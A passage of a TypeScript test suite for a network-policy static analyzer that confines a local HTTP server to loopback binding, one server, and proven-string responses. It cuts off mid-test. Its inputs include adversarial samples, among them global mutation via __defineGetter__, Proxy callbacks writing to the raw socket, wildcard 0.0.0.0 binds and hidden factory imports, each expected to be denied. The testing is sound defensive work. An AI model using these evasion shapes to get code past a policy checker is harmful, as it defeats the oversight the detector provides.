      expect(result.fixpoint.state, source).toBe('CONVERGED');
    }
    // Codex witness: the mutator call is denied on its own, and `response.end(String(1))` is unproven regardless.
    const witness = analyzeNetworkPolicy(
      `${NS}\n(globalThis as any).__defineGetter__('String', () => () => new Proxy(() => {}, { apply(_target: unknown, res: http.ServerResponse) { res.req.socket.write('x'); } }));\nhttp.createServer((request, response) => { response.end(String(1)); });`,
    );
    expect(witness.reasons, describeFindings(witness)).toEqual(['GLOBAL_RECEIVER_CALL', 'RESPONSE_END_ARGUMENT']);
    // The same family through a free mutator: the receiver forwarded as an argument is already an escape.
    for (const source of [
      `Object.defineProperty(globalThis, 'String', { value: 1 });`,
      `Reflect.set(window, 'String', 1);`,
      `Object.assign(self, { String: 1 });`,
      `(Object.prototype as any).__defineGetter__.call(globalThis, 'String', () => 1);`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual(['GLOBAL_RECEIVER_ESCAPE']);
    }
    // Free-global calls go through no receiver; reads of permitted members stay permitted.
    for (const source of [
      `String(1);`,
      `Number('1');`,
      `Object.keys({});`,
      `globalThis.console.log('x');`,
      `globalThis.console;`,
      `typeof globalThis.String;`,
      `globalThis.String.length;`,
      `const { console: c } = globalThis;\nc.log('x');`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
    }
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, "deny(ctx, 'GLOBAL_RECEIVER_CALL'")).toBe(1);
    for (const forbidden of ['__defineGetter__', '__defineSetter__', 'defineProperty', 'eval']) {
      expect(occurrences(detector, `'${forbidden}'`), forbidden).toBe(0);
    }
  });

  it('P1 family: an ambient String(...) call proves nothing, so the String mutation routes no longer matter to response.end', () => {
    const inListener = (body: string): string => `${NS}\nhttp.createServer((request, response) => {\n  ${body}\n});`;
    // response.end(String(...)) is no longer trusted, whatever the argument and however it is reached.
    for (const source of [
      inListener(`response.end(String(1));`),
      inListener(`response.end(String('x'));`),
      inListener(`response.end(String(request.url));`),
      inListener(`const body = String('x');\nresponse.end(body);`),
      inListener(`function page() { return String('x'); }\nresponse.end(page());`),
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual(['RESPONSE_END_ARGUMENT']);
      expect(result.findings, source).toHaveLength(1);
    }
    // Each String mutation route only adds its own finding on top of the same end denial: none of them is load-bearing.
    for (const [mutation, reason] of [
      [`(globalThis.String as any) = () => 1;`, 'GLOBAL_RECEIVER_WRITE'],
      [`(globalThis as any).__defineGetter__('String', () => () => 1);`, 'GLOBAL_RECEIVER_CALL'],
      [`Object.defineProperty(globalThis, 'String', { value: () => 1 });`, 'GLOBAL_RECEIVER_ESCAPE'],
    ] as const) {
      const result = analyzeNetworkPolicy(`${NS}\n${mutation}\nhttp.createServer((request, response) => { response.end(String(1)); });`);
      expect(result.reasons, `${mutation}\n${describeFindings(result)}`).toEqual([reason, 'RESPONSE_END_ARGUMENT']);
    }
    // Every already-proven string path is untouched: literal, template, concat, const, local function.
    for (const source of [
      inListener(`response.end('ok');`),
      inListener('response.end(`<p>${request.url ?? \'\'}</p>`);'),
      inListener(`response.end('<p>' + request.url + '</p>');`),
      inListener(`const body = 'x';\nconst page = body;\nresponse.end(page);`),
      inListener(`function page(title: string) { return \`\${title}\`; }\nresponse.end(page('x'));`),
      inListener(`const page = () => 'x' + request.url;\nresponse.end(page());`),
      REAL_HOST_REPLICA,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
    }
    // Sibling-export string paths through the host module graph.
    const siblings = analyzeNetworkPolicyTree([
      { file: 'styles.ts', text: 'export const STYLES = `body {}`;' },
      { file: 'render.ts', text: 'export function render(title: string): string {\n  return `<h1>${title}</h1>`;\n}' },
      {
        file: 'server.ts',
        text: `${NS}\nimport { render } from './render.js';\nimport { STYLES } from './styles.js';\nhttp.createServer((request, response) => {\n  if (request.url === '/styles.css') { response.end(STYLES); return; }\n  response.end(render('x'));\n}).listen(4317, '127.0.0.1');`,
      },
    ]);
    for (const [file, result] of siblings) expect(result.reasons, `${file}: ${describeFindings(result)}`).toEqual([]);
    // The real host tree stays ALLOW: its bodies are literals, a sibling string constant and a sibling template function.
    for (const [file, result] of analyzeNetworkPolicyTree(readHostClosure())) {
      expect(result.reasons, `${file}: ${describeFindings(result)}`).toEqual([]);
      expect(result.verdict, file).toBe('ALLOW');
    }
    // Structural: the proof names no global identifier.
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, "'String'")).toBe(0);
    expect(occurrences(detector, 'function isProvenString(')).toBe(1);
  });

  it('is structural: one runtime-shadow predicate, threaded through the single symbol-resolution path', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'function isRuntimeShadowed(')).toBe(1);
    expect(occurrences(detector, 'isRuntimeShadowed(ctx.checker, ')).toBe(1);
    expect(occurrences(detector, 'function isRuntimeImportEquals(')).toBe(1);
    expect(occurrences(detector, 'ts.isFunctionExpression(declaration)')).toBe(1);
    expect(occurrences(detector, 'isValueAliasDeclaration')).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Codex review closure: implicit-receiver callbacks and the host module graph (PR #67)
// ---------------------------------------------------------------------------

describe('D3 network policy positive shapes for close and end (PR #67 Codex P1)', () => {
  const withServer = (rest: string): string => `${NS}\nconst server = http.createServer(${L});\n${rest}`;
  const inListener = (body: string): string => `${NS}\nhttp.createServer((request, response) => {\n  ${body}\n});`;
  const serverProxy = `const proxy = new Proxy(() => {}, { apply(_target: unknown, receiver: http.Server) { receiver.listen(4318, '0.0.0.0'); } });`;
  const responseProxy = `const proxy = new Proxy(() => {}, { apply(_target: unknown, res: http.ServerResponse) { res.req.socket.write('x'); } });`;

  it('denies every close call whose callback is not a local function literal, with one finding', () => {
    for (const source of [
      withServer(`${serverProxy}\nserver.close(proxy);`),
      withServer(`declare const onClosed: () => void;\nserver.close(onClosed);`),
      withServer(`server.close(1);`),
      withServer(`server.close(() => {}, 1);`),
      withServer(`declare const args: [() => void];\nserver.close(...args);`),
      withServer(`server.listen(4317, '127.0.0.1').close(new Proxy(() => {}, {}));`),
      withServer(`function setup(s: http.Server) { s.close(new Proxy(() => {}, {})); }\nsetup(server);`),
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual(['SERVER_CLOSE_CALLBACK']);
      expect(result.findings, source).toHaveLength(1);
    }
    for (const source of [
      withServer(`server.close();`),
      withServer(`server.close(() => { console.log('closed'); });`),
      withServer(`server.close(function () { console.log('closed'); });`),
      withServer(`function onClosed() { console.log('closed'); }\nserver.close(onClosed);`),
      withServer(`const onClosed = () => {};\nserver.close(onClosed);`),
    ]) {
      expect(analyzeNetworkPolicy(source).reasons, source).toEqual([]);
    }
  });

  it('denies every end call whose chunk is not a proven string, with one finding', () => {
    for (const source of [
      inListener(`${responseProxy}\nresponse.end('ok', proxy);`),
      inListener(`${responseProxy}\nresponse.end(proxy);`),
      inListener(`declare const body: string;\nresponse.end(body);`),
      inListener(`response.end('x', 'utf8');`),
      inListener(`response.end(() => {});`),
      inListener(`response.end(request.url ?? '');`),
      inListener(`let body = 'x';\nresponse.end(body);`),
      inListener(`const String = (v: unknown) => v;\nresponse.end(String('x'));`),
      inListener(`response.end(String(request.url));`),
      inListener(`response.end(String(1));`),
      inListener(`function echo(v: string) { return v; }\nresponse.end(echo('x'));`),
      inListener(`async function page() { return 'x'; }\nresponse.end(page());`),
      inListener(`function* page() { yield 'x'; }\nresponse.end(page());`),
      inListener(`declare const parts: string[];\nresponse.end(parts.join(''));`),
      inListener(`response.setHeader('a', 'b').end(1);`),
      `${NS}\nfunction send(r: http.ServerResponse, body: string) { r.end(body); }\nhttp.createServer((request, response) => { send(response, 'x'); });`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual(['RESPONSE_END_ARGUMENT']);
      expect(result.findings, source).toHaveLength(1);
    }
    for (const source of [
      inListener(`response.end();`),
      inListener(`response.end('ok');`),
      inListener('response.end(`<p>${request.url ?? \'\'}</p>`);'),
      inListener(`response.end('<p>' + request.url + '</p>');`),
      inListener(`const body = 'x';\nconst page = body;\nresponse.end(page);`),
      inListener(`response.end(request.url === '/' ? 'root' : 'other');`),
      inListener(`function page(title: string) { return \`<h1>\${title}</h1>\`; }\nresponse.end(page('x'));`),
      inListener(`function page() { return '<html></html>'; }\nconst html = page();\nresponse.end(html);`),
      inListener(`const page = () => 'x';\nresponse.end(page());`),
      inListener(`response.setHeader('a', 'b').end('x');`),
      REAL_HOST_REPLICA,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
    }
  });

  it('is structural: one call-shape check after the member policy, three positive predicates', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'function checkAllowedCallShape(')).toBe(1);
    expect(occurrences(detector, 'checkAllowedCallShape(ctx, parent, classes)')).toBe(1);
    expect(occurrences(detector, 'function isProvenString(')).toBe(1);
    expect(occurrences(detector, "'String'")).toBe(0);
    expect(occurrences(detector, 'function hasOnlyLocalCallback(')).toBe(1);
    expect(occurrences(detector, 'function hasOnlyProvenStringChunk(')).toBe(1);
    expect(occurrences(detector, "deny(ctx, 'SERVER_CLOSE_CALLBACK'")).toBe(1);
    expect(occurrences(detector, "deny(ctx, 'RESPONSE_END_ARGUMENT'")).toBe(1);
    expect(occurrences(detector, 'Proxy')).toBe(1);
  });
});

describe('D3 network policy host module graph (PR #67 Codex P1: exported factories across files)', () => {
  const tree = (files: Record<string, string>, options: NetworkPolicyOptions = {}): ReadonlyMap<string, NetworkPolicyResult> =>
    analyzeNetworkPolicyTree(
      Object.entries(files).map(([file, text]) => ({ file, text })),
      options,
    );
  const reasonsOf = (results: ReadonlyMap<string, NetworkPolicyResult>, file: string): readonly string[] => {
    const result = results.get(file);
    if (result === undefined) throw new Error(`no result for ${file}`);
    return result.reasons;
  };
  const REVIEW = `${NS}\nexport function makeReviewServer(): http.Server {\n  return http.createServer(${L});\n}`;

  it('Codex witness: a consumer of an exported factory is held to the loopback binding', () => {
    const wildcard = tree({
      'review.ts': REVIEW,
      'main.ts': `import { makeReviewServer } from './review.js';\nmakeReviewServer().listen(45678, '0.0.0.0');`,
    });
    expect(reasonsOf(wildcard, 'review.ts')).toEqual([]);
    expect(reasonsOf(wildcard, 'main.ts')).toEqual(['SERVER_LISTEN_BINDING']);
    const loopback = tree({
      'review.ts': REVIEW,
      'main.ts': `import { makeReviewServer } from './review.js';\nmakeReviewServer().listen(45678, '127.0.0.1');`,
    });
    expect(reasonsOf(loopback, 'review.ts')).toEqual([]);
    expect(reasonsOf(loopback, 'main.ts')).toEqual([]);
    const standalone = analyzeNetworkPolicy(`import { makeReviewServer } from './review.js';\nmakeReviewServer().listen(45678, '0.0.0.0');`);
    expect(standalone.reasons, 'a lone file cannot know the import is a factory').toEqual([]);
  });

  it('propagates factories through default exports, aliases, re-export chains and the consumer\'s own factories', () => {
    const viaDefault = tree({
      'x.ts': `${NS}\nexport default function make() { return http.createServer(${L}); }`,
      'main.ts': `import make from './x.js';\nmake().listen(1, '0.0.0.0');`,
    });
    expect(reasonsOf(viaDefault, 'main.ts')).toEqual(['SERVER_LISTEN_BINDING']);
    const viaAlias = tree({
      'x.ts': `${NS}\nfunction make() { return http.createServer(${L}); }\nexport { make as build };`,
      'main.ts': `import { build as b } from './x.js';\nb().listen(1, '0.0.0.0');`,
    });
    expect(reasonsOf(viaAlias, 'main.ts')).toEqual(['SERVER_LISTEN_BINDING']);
    const viaChain = tree({
      'review.ts': REVIEW,
      'mid.ts': `export { makeReviewServer } from './review.js';`,
      'star.ts': `export * from './mid.js';`,
      'main.ts': `import { makeReviewServer } from './star.js';\nmakeReviewServer().listen(1, '0.0.0.0');`,
    });
    expect(reasonsOf(viaChain, 'main.ts')).toEqual(['SERVER_LISTEN_BINDING']);
    const viaWrapper = tree({
      'review.ts': REVIEW,
      'wrap.ts': `import { makeReviewServer } from './review.js';\nexport function boot() { return makeReviewServer(); }`,
      'main.ts': `import { boot } from './wrap.js';\nboot().listen(1, '0.0.0.0');`,
    });
    expect(reasonsOf(viaWrapper, 'wrap.ts')).toEqual([]);
    expect(reasonsOf(viaWrapper, 'main.ts')).toEqual(['SERVER_LISTEN_BINDING']);
    const nested = tree(
      {
        'lib/review.ts': REVIEW,
        'main.ts': `import { makeReviewServer } from './lib/review.js';\nmakeReviewServer().listen(1, '0.0.0.0');`,
        'lib\\deep\\entry.ts': `import { makeReviewServer } from '../review.js';\nmakeReviewServer().listen(1, '0.0.0.0');`,
      },
      { separator: '\\' },
    );
    expect(reasonsOf(nested, 'main.ts')).toEqual(['SERVER_LISTEN_BINDING']);
    expect(reasonsOf(nested, 'lib/deep/entry.ts')).toEqual(['CREATE_SERVER_MULTIPLE', 'SERVER_LISTEN_BINDING']);
  });

  it('resolves HostSource names by the platform separator: a POSIX filename keeps its literal backslashes (Codex P1)', () => {
    const FACTORY = `${NS}\nexport function make(): http.Server {\n  return http.createServer(${L});\n}`;
    const consumer = `import { make } from './factory.js';\nmake().listen(4567, '0.0.0.0');`;
    const files = { 'factory.ts': FACTORY, 'nested\\consumer.ts': consumer };
    // POSIX: `nested\\consumer.ts` is a root-level file, so `./factory.js` is the root factory and the wildcard bind is seen.
    const posix = tree(files, { separator: '/' });
    expect([...posix.keys()]).toEqual(['factory.ts', 'nested\\consumer.ts']);
    expect(reasonsOf(posix, 'nested\\consumer.ts')).toEqual(['SERVER_LISTEN_BINDING']);
    // win32: the same name is `nested/consumer.ts`, whose `./factory.js` is a missing `nested/factory.ts` (outside the boundary).
    const windows = tree(files, { separator: '\\' });
    expect([...windows.keys()]).toEqual(['factory.ts', 'nested/consumer.ts']);
    expect(reasonsOf(windows, 'nested/consumer.ts')).toEqual([]);
    // A forward slash is a separator on both platforms.
    for (const separator of ['/', '\\'] as const) {
      const slashed = tree({ 'factory.ts': FACTORY, 'lib/consumer.ts': `import { make } from '../factory.js';\nmake().listen(4567, '0.0.0.0');` }, { separator });
      expect(reasonsOf(slashed, 'lib/consumer.ts'), separator).toEqual(['SERVER_LISTEN_BINDING']);
    }
    // The default is the running platform's separator: exactly what `readdirSync` hands the real-host readers.
    const native = tree(files);
    expect([...native.keys()]).toEqual([...(process.platform === 'win32' ? windows : posix).keys()]);
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'const nativeSeparator = ')).toBe(1);
    expect(occurrences(detector, "process.platform === 'win32'")).toBe(1);
    expect(occurrences(detector, "from 'node:path'")).toBe(0);
  });

  it('resolves specifiers with URL semantics: query, fragment, encoded and dot segments, plain relative paths (Codex P1)', () => {
    const FACTORY = `${NS}\nexport function make(): http.Server {\n  return http.createServer(${L});\n}`;
    const consumer = (specifier: string): string => `import { make } from '${specifier}';\nmake().listen(4317, '0.0.0.0');`;
    // Codex witness: a valid ESM suffix still resolves to the factory source, so the consumer is seeded and the wildcard bind is seen.
    const witness = tree({ 'factory.ts': FACTORY, 'main.ts': consumer('./factory.js?instance') });
    expect(reasonsOf(witness, 'main.ts')).toEqual(['SERVER_LISTEN_BINDING']);
    for (const [importer, specifier] of [
      ['main.ts', './factory.js?instance'],
      ['main.ts', './factory.js#fragment'],
      ['main.ts', './factory.js?a=1&b=2#c'],
      ['main.ts', './factory.ts?x'],
      ['main.ts', './factory?x'],
      ['main.ts', './%66actory.js'],
      ['main.ts', './sub/%2e%2e/factory.js'],
      ['main.ts', './sub/%2E%2E/factory.js?x'],
      ['main.ts', './sub/../factory.js'],
      ['main.ts', '././factory.js'],
      ['main.ts', './factory.js'],
      ['lib/main.ts', '../factory.js?x'],
      ['lib/deep/main.ts', '../../factory.js#x'],
      ['lib/deep/main.ts', '.././../factory.js'],
    ] as const) {
      const results = tree({ 'factory.ts': FACTORY, [importer]: consumer(specifier) });
      expect(reasonsOf(results, importer), `${importer} <- ${specifier}`).toEqual(['SERVER_LISTEN_BINDING']);
    }
    // Encoded and literal characters inside a segment decode to the same tree name.
    for (const specifier of ['./my%20dir/factory.js?x', './my dir/factory.js']) {
      const spaced = tree({ 'my dir/factory.ts': FACTORY, 'main.ts': consumer(specifier) });
      expect(reasonsOf(spaced, 'main.ts'), specifier).toEqual(['SERVER_LISTEN_BINDING']);
    }
    // The POSIX literal-backslash importer stays one root-level segment under URL resolution too.
    const posix = tree({ 'factory.ts': FACTORY, 'nested\\consumer.ts': consumer('./factory.js?instance') }, { separator: '/' });
    expect(reasonsOf(posix, 'nested\\consumer.ts')).toEqual(['SERVER_LISTEN_BINDING']);
    // Outside the boundary: leaving the root, an encoded separator, a malformed escape, a missing file, a non-relative specifier.
    for (const [importer, specifier] of [
      ['main.ts', '../factory.js'],
      ['lib/main.ts', '../../factory.js'],
      ['main.ts', './sub%2f../factory.js'],
      ['main.ts', './sub%5C../factory.js'],
      ['main.ts', './%zzfactory.js'],
      ['main.ts', './factory.js%'],
      ['main.ts', './missing.js?x'],
      ['main.ts', '/abs/factory.js?x'],
      ['main.ts', 'factory.js?x'],
    ] as const) {
      const results = tree({ 'factory.ts': FACTORY, [importer]: consumer(specifier) });
      expect(reasonsOf(results, importer), `${importer} <- ${specifier}`).toEqual([]);
    }
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'function resolveHostSpecifier(')).toBe(1);
    expect(occurrences(detector, 'new URL(')).toBe(3);
    expect(occurrences(detector, "from 'node:url'")).toBe(0);
    expect(occurrences(detector, "from 'node:path'")).toBe(0);
  });

  it('applies the server-instantiation site bound across the tree', () => {
    const twoFiles = tree({
      'review.ts': `${REVIEW}\nmakeReviewServer().listen(4317, '127.0.0.1');`,
      'main.ts': `import { makeReviewServer } from './review.js';\nmakeReviewServer().listen(4318, '127.0.0.1');`,
    });
    expect(reasonsOf(twoFiles, 'review.ts')).toEqual([]);
    expect(reasonsOf(twoFiles, 'main.ts')).toEqual(['CREATE_SERVER_MULTIPLE']);
    const directPlusImported = tree({
      'review.ts': REVIEW,
      'main.ts': `${NS}\nimport { makeReviewServer } from './review.js';\nhttp.createServer(${L}).listen(4317, '127.0.0.1');\nmakeReviewServer().close();`,
    });
    expect(reasonsOf(directPlusImported, 'main.ts')).toEqual(['CREATE_SERVER_MULTIPLE']);
  });

  it('preserves whether an imported factory instantiates a server: alias-returning getters add no site (Codex P2)', () => {
    const GETTER = `${NS}
const server = http.createServer(${L});
export function get(): http.Server {
  return server;
}`;
    const getter = tree({
      'x.ts': GETTER,
      'main.ts': `import { get } from './x.js';
get().listen(4317, '127.0.0.1');
get().close();`,
    });
    expect(reasonsOf(getter, 'x.ts')).toEqual([]);
    expect(reasonsOf(getter, 'main.ts')).toEqual([]);
    const viaChain = tree({
      'x.ts': GETTER,
      'mid.ts': `export { get } from './x.js';`,
      'star.ts': `export * from './mid.js';`,
      'wrap.ts': `import { get } from './star.js';
export function boot() { return get(); }`,
      'main.ts': `import { boot } from './wrap.js';
boot().listen(4317, '127.0.0.1');`,
    });
    for (const file of ['x.ts', 'mid.ts', 'star.ts', 'wrap.ts', 'main.ts']) expect(reasonsOf(viaChain, file), file).toEqual([]);
    // The getter is still a confined factory: its result carries SERVER authority, and the exporter's own site still counts.
    const wildcard = tree({ 'x.ts': GETTER, 'main.ts': `import { get } from './x.js';
get().listen(4317, '0.0.0.0');` });
    expect(reasonsOf(wildcard, 'main.ts')).toEqual(['SERVER_LISTEN_BINDING']);
    const extraSite = tree({
      'x.ts': GETTER,
      'main.ts': `${NS}
import { get } from './x.js';
http.createServer(${L}).close();
get().close();`,
    });
    expect(reasonsOf(extraSite, 'main.ts')).toEqual(['CREATE_SERVER_MULTIPLE']);
    const exported = inspectNetworkPolicy(GETTER);
    expect([...exported.hostExports.factories]).toEqual(['get']);
    expect([...exported.hostExports.instantiatingFactories]).toEqual([]);
    const instantiating = inspectNetworkPolicy(REVIEW);
    expect([...instantiating.hostExports.instantiatingFactories]).toEqual(['makeReviewServer']);
  });

  it('denies every import form through which a factory could leave the graph unseen', () => {
    for (const [consumer, reason] of [
      [`import * as review from './review.js';\nreview.makeReviewServer().listen(1, '0.0.0.0');`, 'SERVER_FACTORY_ESCAPE'],
      [`export * as review from './review.js';`, 'SERVER_FACTORY_ESCAPE'],
      [`import review = require('./review.js');\nreview.makeReviewServer();`, 'SERVER_FACTORY_ESCAPE'],
      [`void import('./review.js');`, 'SERVER_FACTORY_ESCAPE'],
      [`import { makeReviewServer } from './review.js';\nuse(makeReviewServer);`, 'SERVER_FACTORY_ESCAPE'],
      [`import { makeReviewServer } from './review.js';\nconst fns = [makeReviewServer];`, 'SERVER_FACTORY_ESCAPE'],
      [`import { makeReviewServer } from './review.js';\nmakeReviewServer.call(null);`, 'SERVER_FACTORY_ESCAPE'],
      [`import { makeReviewServer } from './review.js';\nmakeReviewServer?.();`, 'SERVER_FACTORY_ESCAPE'],
    ] as const) {
      const results = tree({ 'review.ts': REVIEW, 'main.ts': consumer });
      expect(reasonsOf(results, 'main.ts'), consumer).toContain(reason);
    }
    for (const consumer of [
      `import { makeReviewServer } from './review.js';\nmakeReviewServer().close();`,
      `import { makeReviewServer } from './review.js';\nconst t = typeof makeReviewServer;\nt;`,
      `import { makeReviewServer } from './review.js';\nexport { makeReviewServer };`,
      `import type { makeReviewServer } from './review.js';\nlet x: typeof makeReviewServer | null = null;\nx;`,
      `import * as other from './other.js';\nother.x;`,
    ]) {
      const results = tree({ 'review.ts': REVIEW, 'other.ts': `export const x = 1;`, 'main.ts': consumer });
      expect(reasonsOf(results, 'main.ts'), consumer).toEqual([]);
    }
  });

  it('carries proven strings and string functions across files for response.end', () => {
    const files = {
      'styles.ts': 'export const STYLES = `body {}`;',
      'render.ts': 'export function renderDashboard(title: string): string {\n  return `<h1>${title}</h1>`;\n}',
      'server.ts': `${NS}\nimport { renderDashboard } from './render.js';\nimport { STYLES } from './styles.js';\nexport function buildDashboardHtml(): string { return renderDashboard('x'); }\nexport function createCockpitServer(): http.Server {\n  const page = buildDashboardHtml();\n  return http.createServer((request, response) => {\n    if (request.url === '/styles.css') { response.end(STYLES); return; }\n    response.end(page);\n  });\n}\ncreateCockpitServer().listen(4317, '127.0.0.1');`,
    };
    const results = tree(files);
    for (const file of Object.keys(files)) expect(reasonsOf(results, file), file).toEqual([]);
    const standalone = analyzeNetworkPolicy(files['server.ts']);
    expect(standalone.reasons).toEqual(['RESPONSE_END_ARGUMENT']);
    expect(standalone.findings).toHaveLength(2);
    const unproven = tree({
      ...files,
      'render.ts': `export function renderDashboard(parts: string[]): string {\n  return parts.join('');\n}`,
    });
    expect(reasonsOf(unproven, 'server.ts')).toEqual(['RESPONSE_END_ARGUMENT']);
    const exported = inspectNetworkPolicy(files['server.ts']);
    expect([...exported.hostExports.factories]).toEqual(['createCockpitServer']);
    expect([...exported.hostExports.stringFunctions]).toEqual([]);
  });

  it('is bounded: exports converge within one round per file, and an unresolvable specifier stays outside the boundary', () => {
    const cycle = tree({
      'a.ts': `export { make } from './b.js';`,
      'b.ts': `export { make } from './a.js';`,
      'main.ts': `import { make } from './a.js';\nmake();`,
    });
    expect(reasonsOf(cycle, 'main.ts')).toEqual([]);
    const outside = tree({
      'review.ts': REVIEW,
      'main.ts': `import { makeReviewServer } from '/abs/review.js';\nimport { other } from './missing.js';\nmakeReviewServer().listen(1, '0.0.0.0');\nother();`,
    });
    expect(reasonsOf(outside, 'main.ts')).toEqual([]);
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'function analyzeNetworkPolicyTree(')).toBe(1);
    expect(occurrences(detector, 'function collectHostImports(')).toBe(1);
    expect(occurrences(detector, 'function hostExportsOf(')).toBe(1);
    expect(occurrences(detector, "from 'node:path'")).toBe(0);
  });

  it('respects ECMAScript effective-export semantics when propagating star-export facts (Codex P1)', () => {
    // A legitimate, non-shadowed `export *` keeps carrying the proven-string fact:
    // `response.end(chunk)` is accepted because `chunk` really is a proven string.
    const nonShadowed = tree({
      'safe.ts': `export const chunk = 'safe-body';`,
      'barrel.ts': `export * from './safe.js';`,
      'server.ts': `${NS}\nimport { chunk } from './barrel.js';\nhttp.createServer((request, response) => { response.end(chunk); });`,
    });
    expect(reasonsOf(nonShadowed, 'server.ts')).toEqual([]);

    // The Codex witness: the barrel also explicitly exports `chunk`, which is not a
    // proven string. ECMAScript gives that explicit export precedence, so the
    // star's proven-string fact must not survive — `response.end(chunk)` is denied.
    const shadowed = tree({
      'safe.ts': `export const chunk = 'safe-body';`,
      'barrel.ts': `export * from './safe.js';\nexport function chunk(): void {}`,
      'server.ts': `${NS}\nimport { chunk } from './barrel.js';\nhttp.createServer((request, response) => { response.end(chunk); });`,
    });
    expect(reasonsOf(shadowed, 'barrel.ts')).toEqual([]);
    expect(reasonsOf(shadowed, 'server.ts')).toEqual(['RESPONSE_END_ARGUMENT']);

    // `export *` never re-exports `default`: the star does not carry the source's
    // default factory, so the barrel's default import is unproven.
    const noDefault = tree({
      'src.ts': `${NS}\nexport default function make(): http.Server { return http.createServer(${L}); }`,
      'barrel.ts': `export * from './src.js';`,
      'main.ts': `import make from './barrel.js';\nmake().listen(1, '0.0.0.0');`,
    });
    expect(reasonsOf(noDefault, 'main.ts')).toEqual([]);
    // An explicit `export { default as make }` DOES re-export the default factory,
    // so the same consumer is again held to the loopback binding.
    const explicitDefault = tree({
      'src.ts': `${NS}\nexport default function make(): http.Server { return http.createServer(${L}); }`,
      'barrel.ts': `export { default as make } from './src.js';`,
      'main.ts': `import { make } from './barrel.js';\nmake().listen(1, '0.0.0.0');`,
    });
    expect(reasonsOf(explicitDefault, 'main.ts')).toEqual(['SERVER_LISTEN_BINDING']);

    // A name provided by two different stars is ambiguous under ECMAScript
    // (absent from the namespace), so neither the factory nor the string fact
    // propagates: the factory does not leak and the string is not proven.
    const ambiguous = tree({
      'a.ts': `${NS}\nexport function dup(): http.Server { return http.createServer(${L}); }`,
      'b.ts': `export const dup = 'body';`,
      'barrel.ts': `export * from './a.js';\nexport * from './b.js';`,
      'main.ts': `${NS}\nimport { dup } from './barrel.js';\nhttp.createServer((request, response) => { response.end(dup); });`,
    });
    expect(reasonsOf(ambiguous, 'main.ts')).toEqual(['RESPONSE_END_ARGUMENT']);
  });

  it('counts every server one factory invocation creates, single-file and across files (Codex P1: server cardinality)', () => {
    // Witness: one confined factory whose single invocation runs two
    // http.createServer calls sequentially, invoked once — two servers, denied.
    const sequential = analyzeNetworkPolicy(
      `${NS}\nfunction make() { http.createServer(${L}); return http.createServer(${L}); }\nmake().listen(4317, '127.0.0.1');`,
    );
    expect(sequential.reasons).toEqual(['CREATE_SERVER_MULTIPLE']);
    // Preserved: multiple internal returns are one server per invocation (exclusive
    // branches), and a one-server factory invoked once is allowed.
    const exclusive = analyzeNetworkPolicy(
      `${NS}\nfunction make(x: boolean) { if (x) { return http.createServer(${L}); } return http.createServer(${L}); }\nmake(true).listen(4317, '127.0.0.1');`,
    );
    expect(exclusive.reasons).toEqual([]);
    const single = analyzeNetworkPolicy(
      `${NS}\nfunction make() { return http.createServer(${L}); }\nmake().listen(4317, '127.0.0.1');`,
    );
    expect(single.reasons).toEqual([]);

    // Cross-file: an imported two-server factory invoked once is denied via the
    // propagated multi-instantiation fact; a one-server import is allowed.
    const crossMulti = tree({
      'factory.ts': `${NS}\nexport function make() { http.createServer(${L}); return http.createServer(${L}); }`,
      'main.ts': `import { make } from './factory.js';\nmake().listen(4317, '127.0.0.1');`,
    });
    expect(reasonsOf(crossMulti, 'main.ts')).toEqual(['CREATE_SERVER_MULTIPLE']);
    const crossSingle = tree({
      'factory.ts': `${NS}\nexport function make() { return http.createServer(${L}); }`,
      'main.ts': `import { make } from './factory.js';\nmake().listen(4317, '127.0.0.1');`,
    });
    expect(reasonsOf(crossSingle, 'main.ts')).toEqual([]);
  });

  it('shadows a star export with every explicit binding form, not just an identifier (Codex P1)', () => {
    // A same-name explicit export takes ECMAScript precedence over `export *`,
    // whatever its binding form: an object or array destructuring pattern, or a
    // class. In each case the explicit `chunk` is not a proven string, so the
    // star's proven-string fact must not survive — `response.end(chunk)` is denied.
    const server = `${NS}\nimport { chunk } from './barrel.js';\nhttp.createServer((request, response) => { response.end(chunk); });`;
    for (const explicit of [
      `export const { chunk } = { chunk: (): void => {} };`, // object pattern (the witness)
      `export const [chunk] = [(): void => {}];`, // array pattern
      `export const { inner: { chunk } } = { inner: { chunk: (): void => {} } };`, // nested pattern
      `export class chunk {}`, // class declaration
      `export import chunk = Number;`, // export-modified import-equals alias
    ]) {
      const result = tree({
        'safe.ts': `export const chunk = 'safe-body';`,
        'barrel.ts': `export * from './safe.js';\n${explicit}`,
        'server.ts': server,
      });
      expect(reasonsOf(result, 'barrel.ts'), explicit).toEqual([]);
      expect(reasonsOf(result, 'server.ts'), explicit).toEqual(['RESPONSE_END_ARGUMENT']);
    }
    // Control: with no shadowing explicit binding the star's proven string still flows.
    const nonShadowed = tree({
      'safe.ts': `export const chunk = 'safe-body';`,
      'barrel.ts': `export * from './safe.js';`,
      'server.ts': server,
    });
    expect(reasonsOf(nonShadowed, 'server.ts')).toEqual([]);
  });

  it('counts servers created inside a loop body as more than one (server cardinality)', () => {
    // A confined factory that instantiates inside a loop can create more than one
    // server per invocation, so a single invocation is still denied.
    const loop = analyzeNetworkPolicy(
      `${NS}\nfunction make() { for (let i = 0; i < 2; i += 1) { http.createServer(${L}); } return http.createServer(${L}); }\nmake().listen(4317, '127.0.0.1');`,
